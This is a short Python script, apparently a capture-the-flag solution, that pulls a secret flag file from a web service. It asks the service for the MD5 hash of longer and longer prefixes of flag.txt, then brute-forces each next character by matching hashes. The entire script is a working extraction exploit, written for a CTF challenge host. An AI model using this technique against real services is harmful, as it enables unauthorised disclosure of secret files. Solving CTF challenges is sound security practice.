#!/usr/bin/python3

import hashlib,requests

MAXLENGTH=30

chars = "ABCDEFGHIJKLMNOPQRSTUVWYZabcdefghijklmnopqrstuvwxyz1234567890-=[]\;',./!@#$%^&*()_+{}|:\"<>?"
flag = "STANDCON"

for i in range(8,MAXLENGTH+1):

	# fetch the hash from the website
	url = "http://ec2-3-1-204-6.ap-southeast-1.compute.amazonaws.com:39753/getArticle?maxlength="+str(i)+"&name=flag.txt"
	r = requests.get(url)

	res = (str(r.text).split(' '))[6]
	hash = res[0:len(res)-1]

	temp = flag

	for el in chars:
		temp = temp + el
		h_check = hashlib.md5(temp.encode()).hexdigest()
		if h_check == hash:
			flag = flag + el
			break
		else:
			temp = flag

print(flag)

